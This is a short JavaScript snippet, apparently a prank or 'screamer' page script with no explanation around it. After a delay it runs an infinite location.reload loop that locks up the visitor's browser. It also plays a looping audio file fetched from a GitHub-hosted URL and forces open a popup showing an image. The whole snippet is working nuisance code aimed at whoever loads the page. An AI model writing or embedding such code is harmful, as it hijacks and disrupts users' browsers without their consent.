setTimeout(function(){
    while(1)location.reload(1)
}, 2500);
 
var audio = new Audio("https://github.com/GH0STMA1NE/STUFF/raw/main/We%20Will%20Meet%20Again%20.mp3");
 
audio.oncanplaythrough = function(){
audio.play();
}
 
audio.loop = true;
 
audio.onended = function(){
audio.play();
}
 
window.open("https://i.ytimg.com/vi/RNoHcWE8tbQ/maxresdefault.jpg")
